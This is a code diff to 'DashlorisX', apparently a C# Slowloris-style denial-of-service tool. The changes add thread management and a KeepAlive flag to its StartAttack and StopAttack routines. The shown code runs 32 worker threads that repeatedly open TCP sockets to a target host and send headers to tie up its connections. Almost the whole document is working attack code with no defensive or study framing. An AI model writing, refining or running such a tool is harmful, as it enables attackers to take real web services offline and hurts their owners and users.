@@ -73,8 +73,10 @@ namespace DashlorisX
 	    }
 	}
 
-	readonly List<Socket> Stockings = new List<Socket>();
+	readonly List<Thread> InnerDashBots = new List<Thread>();
 	readonly List<Thread> DashBots = new List<Thread>();
+	
+	readonly List<Socket> Stockings = new List<Socket>();
 
 	string host = string.Empty;
 	string port = string.Empty;
@@ -87,7 +89,7 @@ namespace DashlorisX
 		
 		var result = stocking.BeginConnect(host, DashNet.GetInteger(port), null, null);
 		var success = result.AsyncWaitHandle.WaitOne(500, true);
-
+		
 		if (stocking.Connected)
 		{
 		    byte[] header = Encoding.ASCII.GetBytes(GetHeader());
@@ -120,6 +122,8 @@ namespace DashlorisX
 		};
 
 		DashTimer.AutoReset = false;
+		DashTimer.Enabled = true;
+
 		DashTimer.Start();
 	    }
 
@@ -143,9 +147,9 @@ namespace DashlorisX
 	    }
 	}
 
-	private void StartDashBots()
+	private void StartInnerDashBots()
 	{
-	    foreach (Thread DashBot in DashBots)
+	    foreach (Thread DashBot in InnerDashBots)
 	    {
 		if (DashBots.IndexOf(DashBot) != 0)
 		{
@@ -157,6 +161,8 @@ namespace DashlorisX
 	private Socket GetSocket() =>
 	    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
+	private bool KeepAlive = false;
+
 	public void StartAttack()
 	{
 	    try
@@ -166,22 +172,44 @@ namespace DashlorisX
 
 		LogSend("Starting workers ....");
 
+		KeepAlive = true;
+
 		DashBots.Add(new Thread(() =>
 		{
 		    for (int k = 0; k < 32; k += 1)//worker integration
 		    {
-			DashBots.Add(new Thread(() =>
+			InnerDashBots.Add(new Thread(() =>
 			{
-			    while (true)
+			    while (KeepAlive)
 			    {
 				for (int request = 0; request < 64; request += 1)
 				{
+				    if (!KeepAlive)
+				    {
+					break;
+				    }
+
 				    for (int multiplier = 0; multiplier < 4; multiplier += 1)
 				    {
+					if (!KeepAlive)
+					{
+					    break;
+					}
+
 					SendHeader(GetSocket());
 				    }
 
+				    if (!KeepAlive)
+				    {
+					break;
+				    }
+
 				    Thread.Sleep(2000);//inner interval integration
+				}
+
+				if (!KeepAlive)
+				{
+				    break;
 				}
 
 				Thread.Sleep(8000);//interval integration
@@ -191,7 +219,7 @@ namespace DashlorisX
 			Thread.Sleep(250);//worker portion startup delay
 		    }
 
-		    StartDashBots();
+		    StartInnerDashBots();
 		}));
 
 		StartLatestDashBot();
@@ -208,6 +236,21 @@ namespace DashlorisX
 	    }
 	}
 
+	private void StartSafeTimer()
+	{
+	    var SafeTimer = new System.Timers.Timer(5000)
+	    {
+		AutoReset = false,
+	    };
+
+	    SafeTimer.Start();
+
+	    SafeTimer.Elapsed += (s, e) =>
+	    {
+		DashlorisX.Launch.Text = "Launch";
+	    };
+	}
+
 	public void StopAttack()
 	{//Asynchronously?
 	    DashlorisX.Launch.Text = "Stopping ....";
@@ -216,41 +259,43 @@ namespace DashlorisX
 
 	    try
 	    {
-		for (int k = 0; k < Stockings.Count; k += 1)
+		KeepAlive = false;
+
+		foreach (Socket Stocking in Stockings)
 		{
-		    Socket Stocking = Stockings[k];
-		    
 		    if (Stocking != null)
 		    {
 			if (Stocking.Connected)
 			{
-			    Stocking.Disconnect(false);
 			    Stocking.Close();
 			}
+
+			Stocking.Dispose();
 		    }
-
-		    Stockings.RemoveAt(k);
 		}
 
-		for (int k = 0; k < DashBots.Count; k += 1)
+		Stockings.Clear();
+
+		foreach (Thread InnerDashBot in InnerDashBots)
 		{
-		    DashBots[k].Abort();
-		    DashBots.RemoveAt(k);
+		    InnerDashBot.Abort();
 		}
+
+		InnerDashBots.Clear();
 
 		if (DashTimer.Enabled)
 		{
 		    DashTimer.Stop();
 		    DashTimer = null;
 		}
+
+		StartSafeTimer();
 	    }
 
 	    catch (Exception E)
 	    {
 		throw (ErrorHandler.GetException(E));
 	    }
-
-	    DashlorisX.Launch.Text = "Launch";
 	}
     }
 }
